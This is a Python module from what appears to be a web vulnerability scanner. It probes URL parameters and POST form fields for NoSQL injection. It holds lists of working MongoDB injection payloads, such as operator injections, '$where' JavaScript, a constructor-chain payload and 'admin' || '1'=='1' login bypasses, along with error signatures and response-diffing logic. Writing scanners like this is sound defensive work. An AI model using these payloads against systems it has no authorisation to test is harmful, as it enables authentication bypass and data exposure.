"""NoSQL Injection detection module."""

from __future__ import annotations

import re
from difflib import SequenceMatcher
from typing import Any, Callable
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("nosqli")

_BOOLEAN_PAYLOADS: list[tuple[str, str]] = [
    ('{"$ne":null}', '{"$eq":"__pentavault_never__"}'),
    ('{"$gt":""}', '{"$lt":""}'),
    ('{"$exists":true}', '{"$exists":false}'),
    ('{"$regex":".*"}', '{"$regex":"^$"}'),
    ("admin' || '1'=='1", "admin' && '1'=='2"),
    ("' || this.password && '1'=='1", "' && this.password && '1'=='2"),
]

_ERROR_PAYLOADS = [
    '{"$where":"sleep(1)"}',
    '{"$where":"this.constructor.constructor(\"return 1\")()"}',
    '{"$regex":".*"}',
    '{"$in":["admin", "root"]}',
    '{"$or":[{"role":"admin"},{"active":true}]}',
    '{"$func":"function(){return true}"}',
    "' || 1==1 //",
]

_PARAM_NAMES = re.compile(
    r"(user|username|login|email|password|pass|token|query|search|filter|id)",
    re.IGNORECASE,
)

_ERROR_PATTERNS = [
    re.compile(r"MongoError", re.IGNORECASE),
    re.compile(r"BSON", re.IGNORECASE),
    re.compile(r"CastError", re.IGNORECASE),
    re.compile(r"E11000", re.IGNORECASE),
    re.compile(r"\$where", re.IGNORECASE),
    re.compile(r"NoSQL", re.IGNORECASE),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _looks_like_nosql_param(name: str, value: str) -> bool:
    if _PARAM_NAMES.search(name):
        return True
    v = (value or "").lower()
    return "{" in v or "$" in v


def _boolean_evidence(baseline_text: str, true_text: str, false_text: str) -> str | None:
    if true_text == false_text:
        return None

    sim_true = SequenceMatcher(None, baseline_text, true_text).ratio()
    sim_false = SequenceMatcher(None, baseline_text, false_text).ratio()
    len_diff = abs(len(true_text) - len(false_text))

    if len_diff < max(80, int(len(baseline_text) * 0.06)):
        return None

    if sim_true > sim_false + 0.03:
        return (
            f"Boolean NoSQL behavior diff: similarity true={sim_true:.3f}, "
            f"false={sim_false:.3f}, length diff={len_diff}"
        )
    return None


def _error_evidence(text: str) -> str | None:
    for pattern in _ERROR_PATTERNS:
        match = pattern.search(text)
        if match:
            return f"Observed NoSQL error marker: {match.group(0)}"
    return None


def test_nosqli(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    cookie: str | None = None,
    timeout: float = 10.0,
    quick: bool = False,
    should_stop: Callable[[], bool] | None = None,
) -> list[dict[str, Any]]:
    """Run NoSQL injection checks against discovered URL/form parameters."""
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = cookie

    boolean_payloads = _BOOLEAN_PAYLOADS[:2] if quick else _BOOLEAN_PAYLOADS
    error_payloads = _ERROR_PAYLOADS[:2] if quick else _ERROR_PAYLOADS
    test_endpoints = endpoints[:15] if quick else endpoints
    test_forms = forms[:6] if quick else forms

    with httpx.Client(verify=False, timeout=timeout, follow_redirects=True, headers=headers) as client:
        # ── GET parameters ──────────────────────────────────────────
        for url in test_endpoints:
            if should_stop and should_stop():
                log.info("NoSQLi scan cancelled during GET tests")
                break

            params = parse_qs(urlparse(url).query, keep_blank_values=True)
            if not params:
                continue

            try:
                baseline_resp = client.get(url)
                baseline_text = baseline_resp.text
                baseline_code = baseline_resp.status_code
            except httpx.HTTPError:
                baseline_text = ""
                baseline_code = 0

            for param, values in params.items():
                if should_stop and should_stop():
                    break
                value = values[0] if values else ""
                if not _looks_like_nosql_param(param, value):
                    continue

                sig = (urlparse(url).path, param)
                if sig in seen:
                    continue

                # Boolean tests
                for true_payload, false_payload in boolean_payloads:
                    if should_stop and should_stop():
                        break
                    try:
                        true_resp = client.get(_inject_param(url, param, true_payload))
                        false_resp = client.get(_inject_param(url, param, false_payload))
                    except httpx.HTTPError:
                        continue

                    if baseline_code and (
                        true_resp.status_code != baseline_code or false_resp.status_code != baseline_code
                    ):
                        continue

                    evidence = _boolean_evidence(baseline_text, true_resp.text, false_resp.text)
                    if evidence:
                        findings.append(_to_finding(url, param, true_payload, evidence, "boolean-based"))
                        seen.add(sig)
                        log.info("[NoSQLi] %s param=%s", url, param)
                        break

                if sig in seen:
                    continue

                # Error-based tests
                for payload in error_payloads:
                    if should_stop and should_stop():
                        break
                    try:
                        resp = client.get(_inject_param(url, param, payload))
                    except httpx.HTTPError:
                        continue
                    evidence = _error_evidence(resp.text)
                    if evidence:
                        findings.append(_to_finding(url, param, payload, evidence, "error-based"))
                        seen.add(sig)
                        log.info("[NoSQLi] Error marker on %s param=%s", url, param)
                        break

        # ── POST forms ──────────────────────────────────────────────
        for form in test_forms:
            if should_stop and should_stop():
                log.info("NoSQLi scan cancelled during POST tests")
                break
            if form["method"] != "POST":
                continue

            base_data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
            if not base_data:
                continue

            try:
                baseline_resp = client.post(form["action"], data=base_data)
                baseline_text = baseline_resp.text
                baseline_code = baseline_resp.status_code
            except httpx.HTTPError:
                baseline_text = ""
                baseline_code = 0

            for inp in form["inputs"]:
                if should_stop and should_stop():
                    break
                name = inp["name"]
                if not name:
                    continue
                if not _looks_like_nosql_param(name, inp.get("value", "")):
                    continue

                sig = (urlparse(form["action"]).path, name)
                if sig in seen:
                    continue

                for true_payload, false_payload in boolean_payloads:
                    if should_stop and should_stop():
                        break
                    data_true = dict(base_data)
                    data_false = dict(base_data)
                    data_true[name] = true_payload
                    data_false[name] = false_payload
                    try:
                        true_resp = client.post(form["action"], data=data_true)
                        false_resp = client.post(form["action"], data=data_false)
                    except httpx.HTTPError:
                        continue

                    if baseline_code and (
                        true_resp.status_code != baseline_code or false_resp.status_code != baseline_code
                    ):
                        continue

                    evidence = _boolean_evidence(baseline_text, true_resp.text, false_resp.text)
                    if evidence:
                        findings.append(_to_finding(form["action"], name, true_payload, evidence, "boolean-based"))
                        seen.add(sig)
                        break

                if sig in seen:
                    continue

                for payload in error_payloads:
                    if should_stop and should_stop():
                        break
                    data = dict(base_data)
                    data[name] = payload
                    try:
                        resp = client.post(form["action"], data=data)
                    except httpx.HTTPError:
                        continue
                    evidence = _error_evidence(resp.text)
                    if evidence:
                        findings.append(_to_finding(form["action"], name, payload, evidence, "error-based"))
                        seen.add(sig)
                        break

    log.info("NoSQLi scan complete — %d findings", len(findings))
    return findings


def _to_finding(url: str, param: str, payload: str, evidence: str, variant: str) -> dict[str, Any]:
    return {
        "title": f"NoSQL Injection ({variant}) on {urlparse(url).path}",
        "severity": "High",
        "cvss_score": 8.2,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
        "affected_url": url,
        "parameter": param,
        "payload": payload,
        "evidence": evidence[:300],
        "remediation": "Validate and type-enforce user inputs, avoid directly embedding user data in NoSQL operators, and use strict schema validation.",
        "owasp_category": "A05:2025 - Injection",
    }
